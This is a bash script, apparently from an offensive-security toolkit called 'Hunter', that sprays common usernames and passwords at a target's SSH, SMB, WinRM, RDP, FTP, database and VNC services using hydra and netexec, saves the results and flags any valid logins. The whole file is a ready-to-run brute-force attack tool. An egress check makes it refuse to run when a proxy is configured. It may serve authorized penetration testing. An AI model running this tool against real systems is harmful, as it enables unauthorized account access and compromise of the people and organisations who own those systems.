#!/bin/bash
# Hunter — Credential Spraying
# Usage: ./cred-spray.sh TARGET SERVICE [USERLIST] [PASSLIST]
#
# SERVICE: ssh, smb, rdp, ftp, mysql, pgsql, http-get, http-post, vnc
# Uses hydra for spraying, netexec for SMB/WinRM

set -euo pipefail

TARGET="${1:?Usage: $0 TARGET SERVICE [USERLIST] [PASSLIST]}"
SERVICE="${2:?Specify service: ssh, smb, rdp, ftp, mysql, pgsql, vnc}"
USERLIST="${3:-/usr/share/seclists/Usernames/top-usernames-shortlist.txt}"
PASSLIST="${4:-/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt}"
OUTPUT_DIR="${5:-./recon}"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

mkdir -p "$OUTPUT_DIR/creds"

# ── Egress ──
# A program's egress proxy (roe.json "proxy" / GRIMNIR_PROXY, exported by the calling harness) carries
# HTTP(S) target traffic, but hydra/netexec speak service protocols over raw sockets and cannot ride
# it. When a proxy is configured this refuses (exit 4) rather than spraying from an unproxied address.
source "$(dirname "${BASH_SOURCE[0]}")/../../scripts/egress-env.sh"
egress_init "" || exit 4
egress_refuse_if_proxied "hydra/netexec credential spray" || exit 4

echo "[*] Hunter — Credential Spraying"
echo "[*] Target: $TARGET | Service: $SERVICE"
echo "[*] Users: $USERLIST | Passwords: $PASSLIST"
echo "[*] Started: $(date)"
echo "---"

# Fallback wordlists if SecLists not available
if [ ! -f "$USERLIST" ]; then
    echo "[!] Userlist not found, using built-in: hunter/wordlists/common-users.txt"
    USERLIST="hunter/wordlists/common-users.txt"
fi
if [ ! -f "$PASSLIST" ]; then
    echo "[!] Passlist not found, using built-in: hunter/wordlists/common-passwords.txt"
    PASSLIST="hunter/wordlists/common-passwords.txt"
fi

RESULTS_FILE="$OUTPUT_DIR/creds/${SERVICE}-spray-${TIMESTAMP}.txt"

case "$SERVICE" in
    smb)
        echo "[+] SMB credential spray via netexec"
        netexec smb "$TARGET" -u "$USERLIST" -p "$PASSLIST" --continue-on-success 2>&1 | tee "$RESULTS_FILE"
        ;;
    winrm)
        echo "[+] WinRM credential spray via netexec"
        netexec winrm "$TARGET" -u "$USERLIST" -p "$PASSLIST" --continue-on-success 2>&1 | tee "$RESULTS_FILE"
        ;;
    ssh|rdp|ftp|mysql|pgsql|vnc)
        echo "[+] $SERVICE credential spray via hydra"
        HYDRA_SERVICE="$SERVICE"
        [ "$SERVICE" = "pgsql" ] && HYDRA_SERVICE="postgres"
        hydra -L "$USERLIST" -P "$PASSLIST" -t 4 -f -o "$RESULTS_FILE" "$TARGET" "$HYDRA_SERVICE" 2>&1
        ;;
    *)
        echo "[!] Unsupported service: $SERVICE"
        echo "[*] Supported: ssh, smb, winrm, rdp, ftp, mysql, pgsql, vnc"
        exit 1
        ;;
esac

echo "---"
echo "[*] Credential spray complete"
echo "[*] Results: $RESULTS_FILE"
# Check for successful logins
if grep -qiE "SUCCESS|Pwn3d|\+.*login" "$RESULTS_FILE" 2>/dev/null; then
    echo "[!!!] VALID CREDENTIALS FOUND — review results immediately"
fi
echo "[*] Completed: $(date)"
